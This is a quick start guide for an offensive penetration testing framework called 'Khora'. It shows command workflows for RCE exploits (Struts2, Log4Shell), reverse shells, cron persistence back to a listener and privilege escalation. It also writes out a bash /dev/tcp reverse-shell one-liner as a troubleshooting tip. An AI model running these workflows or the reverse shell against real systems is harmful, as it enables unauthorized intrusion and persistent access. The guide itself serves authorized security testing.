# Khora v2.1 Quick Start Guide

**Developer: 2b53 | Complete Penetration Testing Framework**

---

## 🚀 30-Second Setup

```bash
# 1. Install dependencies
pip3 install -r requirements.txt

# 2. Generate all payloads & exploits
python3 generate_payloads.py

# 3. Run first penetration test
python3 client.py 192.168.1.100 10.10.14.1
```

---

## 📋 What is Khora?

**Khora** is a modular penetration testing framework with 10+ specialized attack modules:

| Module | Purpose | Use Case |
|--------|---------|----------|
| **nmap** | Network scanning | Identify services/vulnerabilities |
| **rce** | Remote code execution | Struts2, Log4Shell, ShellShock attacks |
| **backdoor** | Payload generation | Create reverse shells & persistence |
| **c2** | Command & control | Multi-client shell handler |
| **eternalblue** | SMB exploitation | MS17-010 Windows vulnerability |
| **jailbreak** | Privilege escalation | Container escapes, sudo abuse, Linux privesc |
| **cracker** | Password cracking | Hashcat GPU-accelerated brute force |
| **dns_spoof** | DNS poisoning | Network MITM attacks |
| **sniffer** | Packet capture | Credential detection, protocol analysis |
| **blueborne** | Bluetooth exploitation | BLE device attacks |

---

## ⚡ Common Workflows

### Workflow 1: Reconnaissance

```bash
# Scan network
python3 client.py --target 192.168.1.0/24 --modules nmap

# Or from client menu
python3 client.py
> 1  # Run nmap
> 1  # Intense scan
> 192.168.1.100
```

**Output:** `results/nmap_report_*.json` with all findings

### Workflow 2: Remote Code Execution

```bash
# Test for RCE vulnerabilities
python3 client.py --target 192.168.1.100 --modules rce \
  --lhost 10.10.14.1 --lport 4444

# Choose exploit from menu:
# 1. Apache Struts2 OGNL injection
# 2. Log4J JNDI injection (Log4Shell)
# 3. Bash CGI shellshock
# ... and more
```

**Output:** Reverse shell connection back to listener

### Workflow 3: Post-Exploitation (Privilege Escalation)

```bash
# In reverse shell:
python3 /tmp/jailbreak_module.py --target localhost

# Will:
# 1. Enumerate privesc vectors
# 2. Compile Dirty COW exploit
# 3. Attempt escapes
# 4. Report findings
```

### Workflow 4: Generate Professional Report

```bash
# After assessment
python3 reporting.py --demo --format pdf
# Creates: reports/report_192.168.1.100_TIMESTAMP.pdf

# Or in Python:
from reporting import ExploitationReport
report = ExploitationReport("Security Assessment", "192.168.1.100")
report.add_finding("critical", "RCE Found", "Struts2 vulnerable")
report.add_finding("high", "Weak SSH", "Default credentials admin:admin")
report.save_report(format='pdf')
```

---

## 🎯 Attack Examples

### Example 1: Full Security Assessment

```bash
# 1. Start listener in background
bash payloads/listener_setup.sh 0.0.0.0 4444 &

# 2. Execute penetration test
python3 client.py 192.168.1.100 10.10.14.1

# 3. Choose "full assessment" in menu
# (Runs all modules sequentially)

# 4. Check results
ls results/
# nmap_report_*.json
# rce_results_*.json
# jailbreak_results_*.json
# ... more
```

### Example 2: Targeted RCE + Persistence

```bash
# 1. Find Apache Struts2 app
python3 client.py --target 10.15.2.55 --modules nmap -s 3

# 2. Exploit RCE
python3 client.py --target 10.15.2.55 --modules rce \
  --exploit struts2 --lhost 10.10.14.1 --lport 4444

# 3. In shell, install persistence:
bash /tmp/payloads/persistence/cron_persistence.sh 10.10.14.1 4444

# 4. Verify persistence (should reconnect every 5 min)
sleep 300  # Wait 5 minutes
# New shell should appear
```

### Example 3: Password Cracking

```bash
# Extract hashes from target
python3 client.py --target 192.168.1.100 --modules cracker \
  --hash-file /tmp/hashes.txt \
  --wordlist /usr/share/wordlists/rockyou.txt

# If GPU available (NVIDIA/AMD), uses GPU acceleration
# Output: cracker_results_*.json with cracked passwords
```

---

## 📁 File Structure

```
Khora/
├── client.py                    # Main framework entry point
├── test_khora.py               # Validation test suite
├── generate_payloads.py        # Generate exploits & shells
├── reporting.py                # Report generation engine
├── exploit_chains.py           # Multi-module orchestration
├── sessions.py                 # Campaign session tracking
│
├── modules/                    # 10 exploitation modules
│   ├── nmap_module.py
│   ├── rce_module.py
│   ├── backdoor_module.py
│   ├── c2_module.py
│   └── ... (6 more)
│
├── payloads/                   # Pre-built payload templates
│   ├── reverse_shells.txt      # 10 shell variants
│   ├── listener_setup.sh       # C2 listener
│   └── persistence/            # Post-ex maintenance
│
├── exploits/                   # Compiled & source exploits
│   ├── dirtycow.c             # Source
│   ├── dirtycow               # Binary (on Linux)
│   └── kernel_exp.c
│
├── results/                    # Assessment results
├── logs/                       # Execution logs
├── reports/                    # Generated reports (PDF/HTML/JSON)
└── sessions/                   # Persistent campaign tracking
```

---

## 🔧 Installation

### Requirements
- Python 3.8+
- Linux/Windows/macOS
- ~500MB disk space for payloads

### Install (60 seconds)

```bash
# 1. Clone/extract Khora
cd Khora

# 2. Create virtual environment
python3 -m venv venv
source venv/bin/activate       # Linux/macOS
# or
venv\Scripts\Activate.ps1       # Windows PowerShell

# 3. Install dependencies
pip install -r requirements.txt

# 4. Generate payloads
python3 generate_payloads.py

# 5. Run validation test
python3 test_khora.py

# 6. Start using!
python3 client.py --help
```

---

## 📊 Reports

### Generate Reports in 3 Formats

```bash
# PDF Report (professional)
python3 reporting.py --demo --format pdf

# HTML Report (web-friendly)
python3 reporting.py --demo --format html

# JSON Report (programmatic)
python3 reporting.py --demo --format json
```

**Reports include:**
- Risk scoring (0-10 scale)
- Detailed findings with color coding
- Remediation recommendations
- Timeline of exploitation
- 2b53 Penetration Tester attribution

---

## 🎮 Interactive Menu

```bash
python3 client.py

# Main Menu Options:
# 1. Run Module
#    └─ Select: nmap, rce, backdoor, c2, etc.
# 2. Generate Payloads
#    └─ Create custom reverse shells, exploits
# 3. View Results
#    └─ Browse all assessment results
# 4. Generate Report
#    └─ PDF/HTML/JSON export
# 5. Manage Sessions
#    └─ Track campaigns & c2 sessions
# 6. List Available Modules
# 7. Run Full Assessment [BETA]
# 8. Exit
```

---

## 🚨 Important: Authorization

⚠️ **CRITICAL LEGAL WARNING:**

- **ONLY use on systems you own or have explicit written permission to test**
- Unauthorized access to computer systems is **ILLEGAL**
- All activities are logged for legal compliance
- Author assumes zero responsibility for misuse

Before each engagement:
1. Get written authorization from system owner
2. Define scope (what systems to test)
3. Specify timeline (start/end dates)
4. Document findings for legal protection

---

## 🐛 Troubleshooting

### Issue: "Module not found"
```bash
# Verify all modules load
python3 test_khora.py

# Check module syntax
python3 -m py_compile modules/nmap_module.py
```

### Issue: "Permission denied" on Linux
```bash
# Make scripts executable
chmod +x payloads/*.sh
chmod +x generate_payloads.py
```

### Issue: "Listener not receiving connection"
```bash
# Verify listening
netstat -tlnp | grep 4444     # Linux
netstat -tln | findstr 4444   # Windows

# Check firewall
sudo ufw allow 4444/tcp (Linux)

# Test connection from target
bash -i >& /dev/tcp/10.10.14.1/4444 0>&1
```

### Issue: "reportlab not installed"
```bash
# Install for PDF generation
pip install reportlab
```

---

## 📚 Learn More

- `README.md` - Complete framework documentation
- `PAYLOADS.md` - Payload generation & usage guide
- `SECURITY.md` - Security best practices
- `modules/*/backdoor_module.py` - Study source code
- `test_khora.py` - See framework validation examples

---

## 🚀 Next Steps

1. **Run your first scan:** `python3 client.py --target 192.168.1.1 --modules nmap`
2. **Generate payloads:** `python3 generate_payloads.py`
3. **Practice exploitation:** Use `--demo` flag on modules
4. **Generate report:** `python3 reporting.py --demo --format pdf`
5. **Read advanced docs:** See `PAYLOADS.md` for deep dives

---

**🔐 Khora Security Testing Framework v2.1**  
**Developed by: 2b53**  
*"Security through knowledge"*

For issues/updates: Check framework repository or run `python3 status_report.py`
